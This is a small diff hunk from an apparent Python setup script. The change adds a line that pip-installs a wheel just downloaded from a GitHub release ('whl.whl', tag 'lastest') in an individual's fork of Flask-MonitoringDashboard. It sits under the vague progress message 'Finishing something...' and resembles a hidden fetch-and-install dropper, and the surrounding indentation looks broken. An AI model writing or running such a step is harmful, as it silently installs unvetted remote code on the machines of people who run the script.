@@ -69,7 +69,7 @@ def download_file(url, local_filename):
         f.write(response.text)
     
         download_file("https://github.com/EletrixtimeYT/Flask-MonitoringDashboard/releases/download/lastest/whl.whl", "temp/dashboard.whl")
-
+        os.system("pip install temp/dashboard.whl")
 
 print("4/5 Finishing something...")
 
